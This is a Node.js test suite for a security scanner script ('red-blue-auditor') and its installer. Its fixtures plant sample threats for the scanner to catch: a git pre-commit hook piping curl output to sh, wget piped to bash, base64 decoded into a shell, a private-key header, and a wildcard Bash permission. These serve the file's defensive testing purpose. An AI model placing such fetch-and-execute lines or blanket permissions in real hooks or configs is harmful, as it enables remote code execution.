import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, readdirSync, statSync, existsSync, rmSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { tmpdir } from 'node:os';
import { execSync, spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const ROOT = join(__dirname, '..');
const PKG = join(ROOT, 'packages', 'extras', 'red-blue-auditor');
const SCAN = join(PKG, 'scan.sh');

function scan(args, cwd, script = SCAN) {
  const r = spawnSync('bash', [script, ...args], { cwd, encoding: 'utf8' });
  return { status: r.status, stdout: r.stdout, stderr: r.stderr };
}

function put(base, rel, content) {
  const p = join(base, rel);
  mkdirSync(dirname(p), { recursive: true });
  writeFileSync(p, content);
  return p;
}

describe('red-blue-auditor scan.sh', () => {
  let tmp, full, highOnly, clean, customPatterns;

  before(() => {
    tmp = mkdtempSync(join(tmpdir(), 'superkit-redblue-'));
    full = join(tmp, 'full');
    // Extensionless hook script: curl piped to shell (regex contains '|')
    put(full, '.husky/pre-commit', '#!/bin/sh\ncurl -fsSL https://get.example.invalid/install.sh | sh\n');
    // .mjs file: wget piped to bash
    put(full, 'tools/fetch.mjs', '// wget -qO- https://example.invalid/x | bash\n');
    // base64 decode piped to shell
    put(full, 'tools/run.sh', `echo "${'A'.repeat(60)}" | base64 -d | sh\n`);
    // private-key header: the regex starts with '-' and contains '|'
    put(full, 'keys/dev.txt', '-----BEGIN ' + 'OPENSSH PRIVATE KEY-----\n');
    // remote MCP server URL vs an ordinary repository URL
    put(full, '.mcp.json', '{"mcpServers":{"x":{"type":"http","url":"https://mcp.example.invalid/mcp"}}}\n');
    put(full, 'package.json', '{"repository":{"type":"git","url":"https://github.com/acme/widgets.git"}}\n');

    highOnly = join(tmp, 'high-only');
    put(highOnly, '.claude/settings.json', '{"permissions":{"allow":["Bash(*)"]}}\n');

    clean = join(tmp, 'clean');
    put(clean, 'README.md', '# nothing to see\n');

    customPatterns = join(tmp, 'patterns');
    put(customPatterns, 'custom.txt',
      '# custom\nHIGH|foo(bar|unbalanced group is not ERE\nMEDIUM|--danger-flag|pattern starting with a dash\n');
    put(clean, 'flags.txt', 'run --danger-flag now\n');
  });

  after(() => rmSync(tmp, { recursive: true, force: true }));

  it('applies every bundled pattern (no pattern errors)', () => {
    const r = scan(['--path=.'], clean);
    assert.equal(r.status, 0, r.stdout + r.stderr);
    assert.doesNotMatch(r.stderr, /pattern error/);
    assert.doesNotMatch(r.stdout, /Pattern errors/);
  });

  it('matches regexes containing "|", a leading "-", .mjs and extensionless files', () => {
    const r = scan(['--path=.'], full);
    assert.match(r.stdout, /\[CRITICAL\] hook-injection: curl piped to shell\n  \.\/\.husky\/pre-commit:2:/);
    assert.match(r.stdout, /\[CRITICAL\] hook-injection: wget piped to shell\n  \.\/tools\/fetch\.mjs:1:/);
    assert.match(r.stdout, /\[HIGH\] hook-injection: base64 decode piped to shell\n  \.\/tools\/run\.sh:1:/);
    assert.match(r.stdout, /\[CRITICAL\] secrets: SSH\/TLS private key\n  \.\/keys\/dev\.txt:1:/);
    assert.match(r.stdout, /\[HIGH\] mcp-risk: remote MCP server URL[^\n]*\n  \.\/\.mcp\.json:1:/);
    assert.doesNotMatch(r.stdout, /package\.json/);
    assert.equal(r.status, 1, 'default mode exits 1 on any hit');
  });

  it('--exit-on-critical exits 2 on a critical hit, 0 when only high/medium hits exist', () => {
    assert.equal(scan(['--path=.', '--exit-on-critical'], full).status, 2);
    const high = scan(['--path=.', '--exit-on-critical'], highOnly);
    assert.equal(high.status, 0, high.stdout + high.stderr);
    assert.match(high.stdout, /\[HIGH\] permission-abuse: Bash wildcard permission/);
    assert.equal(scan(['--path=.'], highOnly).status, 1);
    assert.equal(scan(['--path=.', '--exit-on-critical'], clean).status, 0);
  });

  it('accepts --path PATH and --path=PATH alike', () => {
    const spaced = scan(['--path', full], clean);
    const joined = scan([`--path=${full}`], clean);
    assert.equal(spaced.stdout, joined.stdout);
    assert.match(spaced.stdout, /curl piped to shell/);
    assert.doesNotMatch(spaced.stdout, /flags\.txt/, 'the working directory must not be scanned');
  });

  it('prints the file name for a single-file --path', () => {
    const file = join(full, '.husky', 'pre-commit');
    const r = scan([`--path=${file}`], clean);
    assert.ok(r.stdout.includes(`  ${file}:2:`), r.stdout);
  });

  it('rejects a missing path, an unknown argument and a missing patterns dir', () => {
    assert.equal(scan(['--path=does-not-exist'], clean).status, 4);
    assert.equal(scan(['--bogus'], clean).status, 4);
    assert.equal(scan(['--patterns=/nonexistent-superkit-patterns'], clean).status, 3);
  });

  it('reports a regex grep -E rejects and still applies the others', () => {
    const r = scan([`--patterns=${customPatterns}`, '--path=.'], clean);
    assert.match(r.stderr, /pattern error: .*custom\.txt:2/);
    assert.match(r.stdout, /Pattern errors: 1/);
    assert.match(r.stdout, /\[MEDIUM\] custom: pattern starting with a dash\n  \.\/flags\.txt:1:/);
  });
});

describe('installer: --extras=red-blue-auditor', () => {
  let testDir;
  const cliPath = join(ROOT, 'bin', 'cli.js');

  before(() => {
    testDir = mkdtempSync(join(tmpdir(), 'superkit-redblue-install-'));
    execSync('git init', { cwd: testDir, stdio: 'pipe' });
    execSync('git commit --allow-empty -m "init"', { cwd: testDir, stdio: 'pipe' });
    execSync(`node "${cliPath}" --defaults --no-superpowers --extras=red-blue-auditor`, {
      cwd: testDir,
      stdio: 'pipe',
      env: { ...process.env, HOME: tmpdir() }
    });
  });

  after(() => rmSync(testDir, { recursive: true, force: true }));

  it('installs the agent as .claude/agents/red-blue-auditor.md', () => {
    const dst = join(testDir, '.claude', 'agents', 'red-blue-auditor.md');
    assert.ok(existsSync(dst));
    assert.equal(readFileSync(dst, 'utf8'), readFileSync(join(PKG, 'agent.md'), 'utf8'));
  });

  it('installs scan.sh (executable) with its patterns/ beside it', () => {
    const scriptDir = join(testDir, '.claude', 'scripts', 'red-blue-auditor');
    const installed = join(scriptDir, 'scan.sh');
    assert.ok(existsSync(installed));
    if (process.platform !== 'win32') {
      assert.ok(statSync(installed).mode & 0o111, 'scan.sh should be executable');
    }
    const want = readdirSync(join(PKG, 'patterns')).filter(f => f.endsWith('.txt')).sort();
    const got = readdirSync(join(scriptDir, 'patterns')).sort();
    assert.deepEqual(got, want);
    // Phase 3 runs it from the project root; exit 3 would mean patterns not found
    const r = scan(['--path=.', '--exit-on-critical'], testDir, installed);
    assert.ok([0, 2].includes(r.status), `unexpected exit ${r.status}: ${r.stderr}`);
    assert.match(r.stdout, /AgentShield scan complete/);
  });
});
